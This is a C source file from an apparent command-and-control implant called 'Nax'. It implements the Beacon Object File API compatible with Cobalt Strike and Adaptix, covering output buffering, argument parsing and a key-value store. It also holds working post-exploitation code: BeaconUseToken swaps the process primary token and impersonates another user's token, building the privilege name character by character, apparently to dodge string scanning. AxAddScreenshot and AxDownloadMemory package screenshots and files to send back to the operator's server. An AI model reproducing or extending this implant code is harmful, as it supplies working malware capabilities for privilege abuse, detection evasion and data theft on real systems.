/* beacon/src/Bof/Api.c
 * Beacon API implementations - BeaconOutput, BeaconDataParse/Int/Short/Length/Extract,
 * BeaconPrintf, BeaconIsAdmin, BeaconFormat*.
 *
 * All functions use G_INSTANCE to access NAX_INSTANCE via TEB ArbitraryUserPointer.
 * BeaconOutput routes to job->BofCtx (under lock) for async BOFs, or Nax->BofCtx
 * for sync BOFs. BeaconFormatAlloc allocates from beacon heap; caller must free. */

/* included by Loader.c (unity build) - headers already in scope */
#ifndef _NAX_BOF_UNITY_BUILD_
#include "Macros.h"
#include "Instance.h"
#endif /* _NAX_BOF_UNITY_BUILD_ */
#include "Common.h"
#include "Bof.h"

/* ========= [ output ] ========= */

FUNC VOID BeaconOutput( INT type, const CHAR* data, INT len ) {
    G_INSTANCE;
    if ( !Nax || len <= 0 || !data ) return;

    NAX_JOB* job = NaxFindCurrentJob( Nax );
    NAX_BOF_CTX* ctx;

    if ( job ) {
        Nax->Ntdll.RtlEnterCriticalSection( &job->Lock );
        ctx = &job->BofCtx;
    } else {
        ctx = &Nax->BofCtx;
    }

    if ( !ctx->Buf ) {
        if ( job ) Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
        return;
    }

    /* Adaptix sends each BeaconOutput call as a separate message.  We
     * concatenate into one buffer, so insert '\n' between consecutive
     * calls when the previous one didn't end with one. */
    if ( ctx->Len > 0 && ctx->Buf[ ctx->Len - 1 ] != '\n' ) {
        UINT32 sp = ( ctx->Cap > ctx->Len + 1u ) ? 1u : 0u;
        if ( sp ) { ctx->Buf[ ctx->Len ] = '\n'; ctx->Len++; }
    }

    /* leave 1 byte for null terminator */
    UINT32 space = ( ctx->Cap > ctx->Len + 1u ) ? ( ctx->Cap - ctx->Len - 1u ) : 0;
    if ( space == 0 ) {
        if ( job ) Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
        return;
    }

    UINT32 copy = ( (UINT32)len <= space ) ? (UINT32)len : space;
    MmCopy( ctx->Buf + ctx->Len, (PVOID)data, copy );
    ctx->Len        += copy;
    ctx->Buf[ctx->Len] = '\0';

    if ( job ) Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
}

FUNC VOID BeaconPrintf( INT type, const CHAR* fmt, ... ) {
    G_INSTANCE;
    if ( !Nax ) return;

    CHAR buf[1024];
    __builtin_va_list args;
    __builtin_va_start( args, fmt );
    INT n = Nax->Ntdll._vsnprintf( buf, sizeof( buf ) - 1, fmt, args );
    __builtin_va_end( args );
    if ( n < 0 || n >= (INT)( sizeof( buf ) - 1 ) ) n = (INT)( sizeof( buf ) - 1 );
    buf[ n ] = '\0';
    BeaconOutput( type, buf, n );
}

/* ========= [ data parsing ] ========= */

/* BeaconDataPtr - advance parser by 'size' bytes and return the pointer.
 * Unlike BeaconDataExtract it does NOT read a length prefix; the caller
 * already knows the size (e.g. a fixed-size struct). */
FUNC CHAR* BeaconDataPtr( datap* parser, INT size ) {
    if ( size <= 0 || size > parser->length ) return NULL;
    CHAR* ptr        = parser->buffer;
    parser->buffer  += size;
    parser->length  -= size;
    return ptr;
}

/* ax.bof_pack() / CS bof_pack() prefix the packed args with a 4-byte LE total-length
 * header before the first field.  Skip those 4 bytes so BeaconDataExtract/Int read
 * the actual field sequence.  This matches the public CS beacon.h reference. */
FUNC VOID BeaconDataParse( datap* parser, CHAR* buffer, INT size ) {
    INT header  = ( size >= 4 ) ? 4 : 0;
    parser->original = buffer + header;
    parser->buffer   = buffer + header;
    parser->length   = size - header;
    parser->size     = size - header;
}

FUNC INT BeaconDataInt( datap* parser ) {
    if ( parser->length < 4 ) return 0;
    INT val = (INT)( (BYTE)parser->buffer[0]
                   | ( (BYTE)parser->buffer[1] << 8 )
                   | ( (BYTE)parser->buffer[2] << 16 )
                   | ( (BYTE)parser->buffer[3] << 24 ) );
    parser->buffer += 4;
    parser->length -= 4;
    return val;
}

FUNC SHORT BeaconDataShort( datap* parser ) {
    if ( parser->length < 2 ) return 0;
    SHORT val = (SHORT)( (BYTE)parser->buffer[0] | ( (BYTE)parser->buffer[1] << 8 ) );
    parser->buffer += 2;
    parser->length -= 2;
    return val;
}

FUNC INT BeaconDataLength( datap* parser ) {
    return parser->length;
}

/* Extract reads a 4-byte LE length prefix then returns a pointer into the buffer. */
FUNC CHAR* BeaconDataExtract( datap* parser, INT* size ) {
    if ( parser->length < 4 ) return NULL;
    INT len = BeaconDataInt( parser );
    if ( len < 0 || len > parser->length ) return NULL;
    CHAR* ptr        = parser->buffer;
    parser->buffer  += len;
    parser->length  -= len;
    if ( size ) *size = len;
    return ptr;
}

/* ========= [ utility ] ========= */

FUNC BOOL BeaconIsAdmin( VOID ) {
    G_INSTANCE;
    if ( !Nax ) return FALSE;

    HANDLE hToken = NULL;
    if ( Nax->Advapi32.OpenThreadToken )
        Nax->Advapi32.OpenThreadToken( (HANDLE)(LONG_PTR)-2, TOKEN_QUERY, TRUE, &hToken );
    if ( !hToken )
        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &hToken );
    if ( !hToken ) return FALSE;

    struct { DWORD TokenIsElevated; } elev = {0};
    DWORD elevSize = 0;
    BOOL elevated = FALSE;
    if ( Nax->Advapi32.GetTokenInformation &&
         Nax->Advapi32.GetTokenInformation( hToken, (TOKEN_INFORMATION_CLASS)20, &elev, sizeof( elev ), &elevSize ) )
        elevated = ( elev.TokenIsElevated != 0 );

    Nax->Ntdll.NtClose( hToken );
    return elevated;
}

FUNC BOOL BeaconUseToken( HANDLE token ) {
    G_INSTANCE;
    if ( !Nax || !token ) return FALSE;

    if ( !Nax->OriginalPrimaryToken && Nax->Ntdll.NtOpenProcessToken )
        Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ALL_ACCESS, &Nax->OriginalPrimaryToken );

    /* Enable SeAssignPrimaryTokenPrivilege */
    if ( Nax->Advapi32.LookupPrivilegeValueA && Nax->Advapi32.AdjustTokenPrivileges ) {
        HANDLE hProcToken = NULL;
        if ( NT_SUCCESS( Nax->Ntdll.NtOpenProcessToken( NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hProcToken ) ) && hProcToken ) {
            CHAR pn[30];
            pn[ 0]='S'; pn[ 1]='e'; pn[ 2]='A'; pn[ 3]='s'; pn[ 4]='s'; pn[ 5]='i'; pn[ 6]='g'; pn[ 7]='n';
            pn[ 8]='P'; pn[ 9]='r'; pn[10]='i'; pn[11]='m'; pn[12]='a'; pn[13]='r'; pn[14]='y'; pn[15]='T';
            pn[16]='o'; pn[17]='k'; pn[18]='e'; pn[19]='n'; pn[20]='P'; pn[21]='r'; pn[22]='i'; pn[23]='v';
            pn[24]='i'; pn[25]='l'; pn[26]='e'; pn[27]='g'; pn[28]='e'; pn[29]='\0';
            LUID luid;
            MmZero( &luid, sizeof( luid ) );
            if ( Nax->Advapi32.LookupPrivilegeValueA( NULL, pn, &luid ) ) {
                TOKEN_PRIVILEGES tp;
                tp.PrivilegeCount           = 1;
                tp.Privileges[0].Luid       = luid;
                tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                Nax->Advapi32.AdjustTokenPrivileges( hProcToken, FALSE, &tp, 0, NULL, NULL );
            }
            Nax->Ntdll.NtClose( hProcToken );
        }
    }

    /* Swap process primary token */
    if ( Nax->Advapi32.DuplicateTokenEx && Nax->Ntdll.NtSetInformationProcess ) {
        HANDLE hPrimary = NULL;
        if ( Nax->Advapi32.DuplicateTokenEx( token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary ) && hPrimary ) {
            struct { HANDLE Token; HANDLE Thread; } pat = { hPrimary, NULL };
            Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
            Nax->Ntdll.NtClose( hPrimary );
        }
    }

    if ( Nax->Advapi32.ImpersonateLoggedOnUser )
        Nax->Advapi32.ImpersonateLoggedOnUser( token );

    Nax->ActiveToken = token;
    return TRUE;
}

FUNC VOID BeaconRevertToken( VOID ) {
    G_INSTANCE;
    if ( !Nax ) return;

    if ( Nax->Advapi32.RevertToSelf )
        Nax->Advapi32.RevertToSelf();

    if ( Nax->OriginalPrimaryToken && Nax->Ntdll.NtSetInformationProcess ) {
        struct { HANDLE Token; HANDLE Thread; } pat = { Nax->OriginalPrimaryToken, NULL };
        Nax->Ntdll.NtSetInformationProcess( NtCurrentProcess(), ProcessAccessToken, &pat, sizeof( pat ) );
        Nax->Ntdll.NtClose( Nax->OriginalPrimaryToken );
        Nax->OriginalPrimaryToken = NULL;
    }

    Nax->ActiveToken = NULL;
}

FUNC VOID BeaconGetSpawnTo( BOOL x86, CHAR* buffer, INT length ) {
    (void)x86; (void)buffer; (void)length;
    /* Phase 7A stub */
}

FUNC BOOL BeaconInformation( PVOID info ) {
    (void)info;
    return FALSE;   /* Phase 7A stub */
}

/* ========= [ key-value store ] ========= */

FUNC BOOL BeaconAddValue( const CHAR* key, PVOID ptr ) {
    G_INSTANCE;
    if ( !Nax || Nax->Magic != NAX_INSTANCE_MAGIC || !key ) return FALSE;
    UINT32 hash = NaxHashStr( (PCHAR)key );

    NAX_KV_ENTRY* cur = Nax->KvHead;
    while ( cur ) {
        if ( cur->Hash == hash ) { cur->Ptr = ptr; return TRUE; }
        cur = cur->Next;
    }

    NAX_KV_ENTRY* e = (NAX_KV_ENTRY*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_KV_ENTRY ) );
    if ( !e ) return FALSE;
    e->Hash = hash;
    e->Ptr  = ptr;
    e->Next = Nax->KvHead;
    Nax->KvHead = e;
    return TRUE;
}

FUNC PVOID BeaconGetValue( const CHAR* key ) {
    G_INSTANCE;
    if ( !Nax || Nax->Magic != NAX_INSTANCE_MAGIC || !key ) return NULL;
    UINT32 hash = NaxHashStr( (PCHAR)key );

    NAX_KV_ENTRY* cur = Nax->KvHead;
    while ( cur ) {
        if ( cur->Hash == hash ) return cur->Ptr;
        cur = cur->Next;
    }
    return NULL;
}

FUNC BOOL BeaconRemoveValue( const CHAR* key ) {
    G_INSTANCE;
    if ( !Nax || Nax->Magic != NAX_INSTANCE_MAGIC || !key ) return FALSE;
    UINT32 hash = NaxHashStr( (PCHAR)key );

    NAX_KV_ENTRY** pp = &Nax->KvHead;
    while ( *pp ) {
        if ( (*pp)->Hash == hash ) {
            NAX_KV_ENTRY* victim = *pp;
            *pp = victim->Next;
            Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, victim );
            return TRUE;
        }
        pp = &(*pp)->Next;
    }
    return FALSE;
}

FUNC HANDLE BofGetProcessHeap( VOID ) {
    G_INSTANCE;
    if ( !Nax ) return NULL;
    return Nax->Heap;
}

/* toWideChar - thin wrapper around MultiByteToWideChar; widely used by BOFs */
FUNC BOOL toWideChar( CHAR* src, WCHAR* dst, INT max ) {
    G_INSTANCE;
    if ( !Nax || !src || !dst || max <= 0 ) return FALSE;
    INT n = Nax->Kernel32.MultiByteToWideChar( CP_ACP, 0, src, -1, dst, max );
    return ( n > 0 );
}

/* ========= [ Adaptix extensions ] ========= */

/* Helper: write 4-byte LE integer - avoids pulling in Packer.c from the unity build. */
static VOID AxW32( PBYTE p, UINT32 v ) {
    p[0] = (BYTE)v; p[1] = (BYTE)(v>>8); p[2] = (BYTE)(v>>16); p[3] = (BYTE)(v>>24);
}

/* AxBofMediaAppend - allocate a NAX_BOF_MEDIA node and prepend to MediaHead. */
static VOID AxBofMediaAppend( PNAX_INSTANCE Nax, PBYTE data, UINT32 len ) {
    NAX_BOF_MEDIA* node = (NAX_BOF_MEDIA*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, sizeof( NAX_BOF_MEDIA ) );
    if ( !node ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, data ); return; }
    node->Data = data;
    node->Len  = len;

    NAX_JOB* job = NaxFindCurrentJob( Nax );
    if ( job ) {
        Nax->Ntdll.RtlEnterCriticalSection( &job->Lock );
        node->Next = job->BofCtx.MediaHead;
        job->BofCtx.MediaHead = node;
        Nax->Ntdll.RtlLeaveCriticalSection( &job->Lock );
    } else {
        node->Next = Nax->BofCtx.MediaHead;
        Nax->BofCtx.MediaHead = node;
    }
}

/* AxAddScreenshot - sends a screenshot image back to the Adaptix server.
 * Packs as: [0x81][note_len(4LE)][note][img_len(4LE)][img]
 * Appended to BofCtx.MediaHead so multiple media per BOF are supported. */
FUNC VOID AxAddScreenshot( CHAR* note, CHAR* data, INT len ) {
    G_INSTANCE;
    if ( !Nax || !data || len <= 0 ) return;

    UINT32 note_len = 0;
    if ( note ) { const PCHAR p = note; while ( p[note_len] ) note_len++; }
    UINT32 total    = 1u + 4u + note_len + 4u + (UINT32)len;

    PBYTE buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, total );
    if ( !buf ) return;

    PBYTE p = buf;
    *p++ = CALLBACK_AX_SCREENSHOT;
    AxW32( p, note_len );   p += 4;
    if ( note_len ) { MmCopy( p, note, note_len ); p += note_len; }
    AxW32( p, (UINT32)len ); p += 4;
    MmCopy( p, data, (UINT32)len );

    AxBofMediaAppend( Nax, buf, total );
}

/* AxDownloadMemory - sends a file download back to the Adaptix server.
 * Packs as: [0x82][name_len(4LE)][name][data_len(4LE)][data]
 * Appended to BofCtx.MediaHead so multiple downloads per BOF are supported. */
FUNC VOID AxDownloadMemory( CHAR* filename, CHAR* data, INT len ) {
    G_INSTANCE;
    if ( !Nax || !data || len <= 0 ) return;

    UINT32 name_len = 0;
    if ( filename ) { const PCHAR p = filename; while ( p[name_len] ) name_len++; }
    UINT32 total    = 1u + 4u + name_len + 4u + (UINT32)len;

    PBYTE buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, total );
    if ( !buf ) return;

    PBYTE p = buf;
    *p++ = CALLBACK_AX_DOWNLOAD_MEM;
    AxW32( p, name_len );    p += 4;
    if ( name_len ) { MmCopy( p, filename, name_len ); p += name_len; }
    AxW32( p, (UINT32)len ); p += 4;
    MmCopy( p, data, (UINT32)len );

    AxBofMediaAppend( Nax, buf, total );
}

/* ========= [ async BOF APIs ] ========= */

FUNC VOID BeaconWakeup( VOID ) {
    G_INSTANCE;
    if ( !Nax || !Nax->JobWakeEvent ) return;
    Nax->Kernel32.SetEvent( Nax->JobWakeEvent );
}

FUNC HANDLE BeaconGetStopJobEvent( VOID ) {
    G_INSTANCE;
    if ( !Nax ) return NULL;
    NAX_JOB* job = NaxFindCurrentJob( Nax );
    if ( !job ) return NULL;
    return job->hStopEvent;
}

/* ========= [ format buffer ] ========= */

FUNC VOID BeaconFormatAlloc( formatp* format, INT maxsz ) {
    G_INSTANCE;
    if ( !Nax || maxsz <= 0 ) { format->original = NULL; return; }
    format->original = (CHAR*)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, (SIZE_T)maxsz );
    format->buffer   = format->original;
    format->length   = 0;
    format->size     = maxsz;
}

FUNC VOID BeaconFormatReset( formatp* format ) {
    format->buffer = format->original;
    format->length = 0;
    if ( format->original && format->size > 0 )
        format->original[0] = '\0';
}

FUNC VOID BeaconFormatFree( formatp* format ) {
    G_INSTANCE;
    if ( !Nax || !format->original ) return;
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, format->original );
    format->original = NULL;
    format->buffer   = NULL;
    format->length   = 0;
    format->size     = 0;
}

FUNC VOID BeaconFormatAppend( formatp* format, CHAR* text, INT len ) {
    if ( !format->original || format->length + len >= format->size ) return;
    MmCopy( format->buffer, text, (UINT32)len );
    format->buffer += len;
    format->length += len;
}

FUNC VOID BeaconFormatPrintf( formatp* format, CHAR* fmt, ... ) {
    G_INSTANCE;
    if ( !Nax || !format->original ) return;
    CHAR buf[512];
    __builtin_va_list args;
    __builtin_va_start( args, fmt );
    INT n = Nax->Ntdll._vsnprintf( buf, sizeof( buf ) - 1, fmt, args );
    __builtin_va_end( args );
    if ( n > 0 ) BeaconFormatAppend( format, buf, n );
}

FUNC CHAR* BeaconFormatToString( formatp* format, INT* size ) {
    if ( size ) *size = format->length;
    return format->original;
}

FUNC VOID BeaconFormatInt( formatp* format, INT value ) {
    /* Pack as 4-byte big-endian (network order - Cobalt Strike convention) */
    CHAR buf[4];
    buf[0] = (CHAR)( ( value >> 24 ) & 0xFF );
    buf[1] = (CHAR)( ( value >> 16 ) & 0xFF );
    buf[2] = (CHAR)( ( value >>  8 ) & 0xFF );
    buf[3] = (CHAR)(   value         & 0xFF );
    BeaconFormatAppend( format, buf, 4 );
}
